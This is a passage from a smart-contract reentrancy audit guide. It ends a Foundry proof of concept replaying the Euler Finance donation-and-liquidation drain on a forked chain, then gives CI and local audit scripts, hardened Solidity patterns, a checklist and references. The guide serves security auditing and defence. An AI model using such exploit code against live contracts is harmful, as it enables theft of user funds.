        IEuler(EULER).donateToReserves(DAI, 100_000_000e18);
        // 6. Self-liquidate, capturing the donation

        vm.stopPrank();
        // Verify: attacker balance > starting balance
    }
}
```

```bash
forge test --match-test testPoC_EulerDonateLiquidateDrain \
  --fork-url http://localhost:8545 \
  --fork-block-number 16807963 -vvvv 2>&1 | tee evidence/euler_poc.log
```

### 9.3 Replay the Wormhole exploit

Wormhole was drained on Solana, not EVM, but the EVM-side wrapped mint can be replayed:

```bash
# Wormhole EVM gateway at 0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464118
# Solana-side attack — needs Solana tooling (not Foundry)
# For EVM-side verification, check the guardian set logic:
solc-select install 0.8.0 && solc-select use 0.8.0
slither wormhole/ethereum/contracts --detect reentrancy-eth,arbitrary-send
```

### 9.4 Slither CI Integration

```yaml
# .github/workflows/audit.yml
name: Smart Contract Audit
on: [push, pull_request]

jobs:
  slither:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: nightly
      - run: pip3 install slither-analyzer solc-select
      - run: solc-select install 0.8.24 && solc-select use 0.8.24
      - name: Slither Run
        run: |
          slither . \
            --exclude naming-convention,solhint-version,pragma \
            --filter-paths "lib|test|script|mocks" \
            --json slither_report.json
      - name: Fail on High findings
        run: |
          HIGH_COUNT=$(jq '[.results.detectors[] | select(.impact == "High")] | length' slither_report.json)
          if [ "$HIGH_COUNT" -gt "0" ]; then
            echo "::error::$HIGH_COUNT High-severity Slither findings"
            exit 1
          fi

  forge-invariants:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: foundry-rs/foundry-toolchain@v1
      - run: forge install
      - run: forge test --match-test invariant_ -vvv --fuzz-runs 10000
```

### 9.5 Local Audit Workflow

```bash
#!/usr/bin/env bash
# audit-local.sh — run the full audit toolkit on a target repo

set -e
TARGET=${1:-.}
OUTPUT_DIR=${OUTPUT_DIR:-audit_output}

mkdir -p $OUTPUT_DIR

echo "[+] Slither (static analysis)"
slither $TARGET --filter-paths "lib|test|script" \
  --exclude naming-convention,solhint-version,pragma \
  --json $OUTPUT_DIR/slither.json
jq '[.results.detectors[] | select(.impact == "High" or .impact == "Medium")] | length' \
  $OUTPUT_DIR/slither.json

echo "[+] Mythril (symbolic execution)"
myth analyze $TARGET/src --execution-timeout 600 --max-depth 30 \
  --modules reentrancy,arithmetic,transaction_order_independence \
  -o json > $OUTPUT_DIR/mythril.json

echo "[+] Foundry fuzz + invariants"
forge test --match-test testFuzz -vvv --fuzz-runs 10000 | tee $OUTPUT_DIR/fuzz.log
forge test --match-test invariant_ -vvv --fuzz-runs 1000 | tee $OUTPUT_DIR/invariants.log

echo "[+] Bytecode verification"
diff <(cast code 0xTarget --rpc-url $RPC) \
     <(forge inspect src/Vault.sol:Vault irOptimized | jq -r '.bytecode.object') \
  | tee $OUTPUT_DIR/bytecode_diff.txt

echo "[+] Reports written to $OUTPUT_DIR/"
```

---

## 10. Defense Patterns — Modern Reentrancy Hardening

### 10.1 Layered defense

A single defense is not enough. Modern contracts should layer:

1. **Checks-Effects-Interactions** — zero balances before external calls
2. **OpenZeppelin `ReentrancyGuard`** — `nonReentrant` modifier on every external function that calls out
3. **Read-only reentrancy guard** — separate transient flag checked on view functions
4. **Pull-payment pattern** — users claim refunds via `withdraw()` rather than receiving push payments
5. **Multisig + timelock on admin** — defense against social-engineering of privileged functions

```solidity
// Layered defense example
contract HardenedVault is ReentrancyGuard, AccessControl {
    using SafeERC20 for IERC20;
    IERC20 public immutable token;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public pendingWithdrawals;
    uint256 private _viewLocked = 1;

    modifier nonReadReentrant() { require(_viewLocked == 1); _viewLocked = 2; _; _viewLocked = 1; }

    function deposit(uint256 amount) external nonReentrant {
        token.safeTransferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;          // Effect after Interaction (SafeERC20 measures delta)
    }

    // Pull-payment: don't push ETH/tokens during withdraw
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        pendingWithdrawals[msg.sender] += amount;  // queue, don't send
        emit WithdrawalQueued(msg.sender, amount);
    }

    function claim() external nonReentrant {
        uint256 due = pendingWithdrawals[msg.sender];
        pendingWithdrawals[msg.sender] = 0;
        token.safeTransfer(msg.sender, due);
    }

    function totalAssets() external nonReadReentrant returns (uint256) {
        return token.balanceOf(address(this));
    }
}
```

### 10.2 Token-standard hardening

- ERC-777: treat any transfer as a full external call (reentrancy guard + balance-delta accounting)
- ERC-721: do not assume `ownerOf(tokenId)` is set after `safeMint` returns
- ERC-1155: reentrancy guard on the outer batch loop, not per-iteration
- ERC-4626: virtual shares + virtual assets; reject direct donations via balance-delta check

### 10.3 Composability hardening

- Whitelist all integrated protocols (no arbitrary external calls)
- Snapshot all external state (oracle prices, share prices) before calling out
- Reject reentry from non-whitelisted callers via `tx.origin` (carefully — never as auth)

---

## 11. Checklist — Modern Reentrancy Audit

For every external/public function in the contract, answer:

- [ ] What external calls does it make? (Token transfers, oracle reads, callback hooks)
- [ ] Does it follow CEI (state zeroed before external call)?
- [ ] Does it have a `nonReentrant` modifier?
- [ ] Does it interact with token standards that fire callbacks (ERC-777, ERC-721, ERC-1155)?
- [ ] Does it read state from another contract that itself has external calls?
- [ ] Are there view functions that depend on mid-state reads? (read-only reentrancy)
- [ ] Are there batch functions where iteration order matters? (ERC-1155 batch)
- [ ] Does it use `delegatecall` to any address that could be upgraded? (proxy reentrancy)
- [ ] Does it integrate with a bridge? (cross-chain reentrancy)
- [ ] Does it price shares via `balanceOf`? (donation attack)
- [ ] Does it have dead shares or virtual offsets for share pricing?
- [ ] Are admin functions behind timelock + multisig?
- [ ] Is the contract compiled with a known-good compiler version (Vyper >= 0.3.10)?
- [ ] Does the deployed bytecode match the audited source?
- [ ] Is there an Echidna/Foundry invariant covering the function?

If any answer is "I don't know" or "no," that's a finding.

---

## 12. References — Tools and Reading

### Tools

- **Slither**: [github.com/crytic/slither](https://github.com/crytic/slither)
- **Mythril**: [github.com/Consensys/mythril](https://github.com/Consensys/mythril)
- **Echidna**: [github.com/crytic/echidna](https://github.com/crytic/echidna)
- **Manticore**: [github.com/trailofbits/manticore](https://github.com/trailofbits/manticore)
- **Foundry**: [github.com/foundry-rs/foundry](https://github.com/foundry-rs/foundry)
- **Certora Prover**: [github.com/Certora/CertoraProver](https://github.com/Certora/CertoraProver)
- **Halmos**: [github.com/a16z/halmos](https://github.com/a16z/halmos)
- **Medusa**: [github.com/crytic/medusa](https://github.com/crytic/medusa)
- **Heimdall**: [github.com/Jon-Becker/heimdall-dsl](https://github.com/Jon-Becker/heimdall-dsl)

### Incident Databases

- **Rekt.news**: [rekt.news/leaderboard](https://rekt.news/leaderboard) — categorized by loss
- **DeFi Security Database**: [github.com/defi-security/defi-attacks](https://github.com/defi-security/defi-attacks)
- **Chainalysis Crypto Crime Reports**: [chainalysis.com/blog](https://www.chainalysis.com/blog) — annual + mid-year
- **SlowMist Incident Database**: [hacked.slowmist.io](https://hacked.slowmist.io)
- **Solana Foundation Bridge Report**: post-mortems for Wormhole, Nomad, Ronin

### Standards

- **SWC Registry**: [swcregistry.io](https://swcregistry.io) — SWC-107 (Reentrancy), SWC-114 (TOD)
- **ERC-4626**: [eips.ethereum.org/EIPS/eip-4626](https://eips.ethereum.org/EIPS/eip-4626) — vault standard
- **ERC-777**: [eips.ethereum.org/EIPS/eip-777](https://eips.ethereum.org/EIPS/eip-777) — callback token standard
- **EIP-1153**: [eips.ethereum.org/EIPS/eip-1153](https://eips.ethereum.org/EIPS/eip-1153) — transient storage (cheap reentrancy guard)

### Wargames

- **Damn Vulnerable DeFi**: [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz) — has a Curve-class level
- **Ethernaut**: [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com) — reentrancy level is foundational
- **Curvance Crisis**: [curvance.gitbook.io](https://curvance.gitbook.io) — composability-focused

### Post-mortems (required reading)

- **Curve Finance (July 2023)**: Vyper compiler bug report by the Curve team
- **Euler Finance (March 2023)**: official post-mortem at `https://rekt.news/euler-rekt/`
- **Wormhole (Feb 2022)**: Solana program verifier bug, Certora post-mortem
- **Multichain (July 2023)**: Elliptic analysis of custodial bridge risk
- **BonqDAO (Dec 2022)**: oracle trust analysis by Chainalysis

---

## 13. Summary — A Reentrancy Mental Model

For every contract you audit, build this mental model:

1. **External call map** — every line that calls another contract. Include token transfers.
2. **Callback surface** — for every external call, what hook does the called contract fire? (ERC-777 → `tokensToSend` + `tokensReceived`; ERC-721 → `onERC721Received`; ERC-1155 → `onERC1155Received`).
3. **State at callback** — for every callback, what is the storage state at the moment the callback fires? If it differs from the post-call state, that's a reentrancy window.
4. **Cross-function read** — for every callback, what other functions on the victim read state that is currently mid-update?
5. **Cross-contract read** — for every callback, what other contracts read state from the victim during the callback?
6. **Composability path** — does the victim integrate with another protocol whose own state could be mid-update when the victim reads it?
7. **Compiler trust** — is the contract compiled with a known-good compiler version? Verify the bytecode matches the source.
8. **Cross-chain finality** — if the contract is a bridge, what is the lock finality window?

Reentrancy at the code level has been understood for ten years. The modern attack surface is in composability, token-standard hooks, and compiler bugs. Audit accordingly.

---

**Related files**: `SKILL.md`, `payloads.md`, `test-cases.md`, `guides/smart-contract-audit-playbook.md`, `guides/defi-exploit-testing-playbook.md`
